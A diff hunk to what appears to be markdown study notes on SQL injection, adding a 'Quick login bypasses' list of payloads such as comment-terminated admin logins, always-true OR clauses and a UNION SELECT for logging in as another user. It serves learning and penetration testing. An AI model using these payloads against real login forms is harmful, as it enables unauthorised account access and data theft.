@@ -9,3 +9,16 @@
 * *Authentication Bypass* - Try `' OR 1=1;--` or other always true statement.
 * *Boolean-based* - Deductive reasoning by generating false values until discovering actual value.
 * *Time-based* - Using SLEEP statements like `UNION SELECT SLEEP(5);--`.
+
+### Quick login bypasses
+* `admin' --`
+* `admin' #`
+* `admin'/*`
+* `' or 1=1--`
+* `' or 1=1#`
+* `' or 1=1/*`
+* `') or '1'='1--`
+* `') or ('1'='1--`
+*  Login as different user (SM*)
+  `UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
+More at https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
